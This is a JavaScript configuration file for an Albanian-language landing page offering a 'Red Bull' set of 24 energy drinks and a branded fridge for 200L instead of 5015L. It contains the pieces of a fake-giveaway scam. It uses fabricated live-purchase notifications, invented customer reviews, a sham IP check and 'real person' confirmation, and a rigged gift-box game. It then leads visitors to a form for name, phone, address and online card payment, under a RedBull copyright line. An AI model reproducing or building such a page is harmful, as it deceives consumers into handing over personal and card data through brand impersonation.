const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "al";
  const lang = "sq-AL";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Madhësia: ",
    arr: []
  };

  const mainProduct = {
    header: "Ofertë e Kufizuar",
    name: "Set me 24 pije energjike Red Bull + Frigorifer Markë",
    oldPrice: "5015L",
    newPrice: "200L",
    selectText: "",
    text: `
      Ky set i pijeve energjike Red Bull nuk do t'ju lërë indiferent! Energjia dhe gëzimi që kjo pije energjike ofron, do t'ju japë fuqi gjatë gjithë ditës. Dhe frigoriferi ruan shijen dhe freskinë e tij, kështu që mund të shijoni shijen në çdo kohë.
  <br><br>
      Pija më e popullarizuar që nuk mund t'i rezistoni!
  <br><br>
      Nxito dhe përfito nga kjo mundësi e kufizuar!`,
  };

  const notifications = [
    {
      user: "Ardian S*****",
      location: "Tiranë, Shqipëri",
      action: "Sapo bleva një set të mrekullueshëm për 200L!",
      timeago: "15 sekonda më parë",
    },
    {
      user: "Besnik B******",
      location: "Durrës, Shqipëri",
      action: "Sapo bleva një set të mrekullueshëm për 200L!",
      timeago: "25 sekonda më parë",
    },
  ];

  const reviewsArr = [
    {
      name: "Jakob",
      time: "1 ditë më parë",
      header: "Gjënë e dobishme!",
      product: "26468782",
      review:
        "Ky frigorifer është praktik, kompakt dhe zë shumë pak hapësirë. E vendosa në zyrë dhe tani gjithmonë mund të marr një pije të ftohtë.",
    },
    {
      name: "Noah",
      time: "5 ditë më parë",
      header: "Shtytës i përkryer energjie!",
      product: "26468782",
      review:
        "Seti është shumë i bukur, në fillim nuk besoja që mund të kishte një çmim kaq të ulët, por erdhi në një pjesë të vetme, faleminderit RedBull për këtë aksion!",
    },
    {
      name: "Elias",
      time: "2 ditë më parë",
      header: "Pija energjike e preferuar!",
      product: "26468782",
      review:
        "Unë e dua Red Bull, pi pije energjike gjithmonë.",
    },
    {
      name: "David",
      time: "3 ditë më parë",
      header: "Pija më e mirë energjike!",
      product: "26468782",
      review:
        "Asnjëherë nuk kam dyshuar në cilësinë e kësaj pijeje, është kaq e pasur dhe e këndshme në shije, dhe frigoriferi u përshtat në mënyrë perfekte me ambientin tim.",
    },
    {
      name: "Jonas",
      time: "5 ditë më parë",
      header: "Fitorja është në anën time!",
      product: "26468782",
      review:
        "Gjithmonë e dija që mund të fitoja këtë aksion, sepse i dua pijet energjike.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "",
    percent: "",
    rec: "komente për këtë aksion",
  };

  const questions = {
    _of: "Pyetja {1}/{2}:",
    arr: [
      {
        q: "A keni blerë më parë produkte Red Bull?",
        a: ["PO", "JO"],
      },
      {
        q: "Për kë është ky set?",
        a: [
          "për familjen",
          "për një mik",
          "Për mua",
        ],
      },
      {
        q: "A do të rekomandonit produktet tona te miqtë tuaj?",
        a: ["PO", "JO"],
      },
    ],
  };

  const check = {
    title: "Përgjigjja juaj do të shqyrtohet.",
    arr: [
      "3/3. Ju keni përgjigjur pyetjes.",
      "Adresa juaj IP nuk tregon ndonjë kërkesë të mëparshme për ne.",
      "Përgjigjja juaj është konfirmuar.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Urime, ju konfirmuat që jeni një person i vërtetë",
        button: "OK",
        text: `
      <center>
      Sot, {date}, ju keni mundësinë të fitoni një set me 24 pije energjike Red Bull + Frigorifer Markë.
        <br><br>
      Ju duhet vetëm të zgjidhni kutinë e saktë të dhuratës.
        <br><br>
      Ju keni 3 përpjekje, fat të mirë!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh jo...",
        button: "OK",
        text: `
      <center>
    Fatkeqësisht kjo dhuratë është bosh! Ju keni edhe 2 përpjekje, fat të mirë!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Urime! Ju fituat!",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
         Ju fituat setin „24 pjesë Red Bull Energy Drink“ + Frigorifer Markë
        </p>
        <br>
          1) Klikoni "OK" për të shkuar te faqja e dërgesës.
          <br><br>
          2) Plotësoni formularin dhe paguani porosinë duke përfituar nga zbritja juaj personale.
          <br><br>
          3) Paketa do të dorëzohet brenda 2-3 ditësh.
      </center>
    `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Të Dhënat Personale",
      fields: {
        name: {
          field: "Emri",
        },
        family: {
          field: "Mbiemri",
        },
        phone: {
          field: "Numri i telefonit",
        },
        email: {
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Dorëzimi",
      fields: {
        city: {
          field: "Qyteti",
        },
        address: {
          field: "Adresa e dorëzimit",
        },
        zip: {
          field: "Kodi postar",
        },
      },
    },
    payment: {
      title: "Metodat e Pagesës",
      creditCard: "Pagesë online me kartë bankare",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detajet e Porosisë",
      oldPrice: "5015L",
      newPrice: "200L",
      size: "Madhësia",
      subTotal: {
        title: "Nëntotali",
        amount: "200L",
      },
      delivery: {
        title: "Dorëzimi",
        amount: "0L",
      },
      total: {
        title: "Totali",
        amount: "200L",
      },
      checkoutButton: "Paguaj porosinë",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/sl_1.png",
      images: [
        "./assets/sl_1.png",
        "./assets/r1.jpeg",
        "./assets/r2.jpeg",
        "./assets/r3.jpg",
        "./assets/sl_4.jpg",
        "./assets/sl_5.jpg",
      ]
    }
  ];

  const footer = {
    cr: "© 2024 RedBull. Të gjitha të drejtat të rezervuara.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = mainProduct.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
